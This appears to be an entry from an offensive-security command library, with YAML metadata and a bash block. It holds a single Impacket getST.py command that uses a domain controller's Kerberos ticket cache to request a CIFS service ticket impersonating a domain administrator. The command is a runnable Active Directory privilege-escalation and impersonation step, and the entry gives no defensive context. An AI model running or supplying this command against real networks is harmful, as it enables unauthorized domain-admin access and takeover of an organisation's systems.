---
id: d206c016-76e7-4974-ac50-429ec70c226b
name: Get Service Ticket (ST) for cifs/DomainController.domain.local
type: command
executor: bash
data: KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin'
  -spn 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local'
  'domain.local'/'DomainController'
output: null
created_at: '2023-04-06T03:56:03.097177+00:00'
updated_at: '2023-04-10T20:26:11.555942+00:00'
---

# Get Service Ticket (ST) for cifs/DomainController.domain.local

```bash
KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -spn 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController'
```
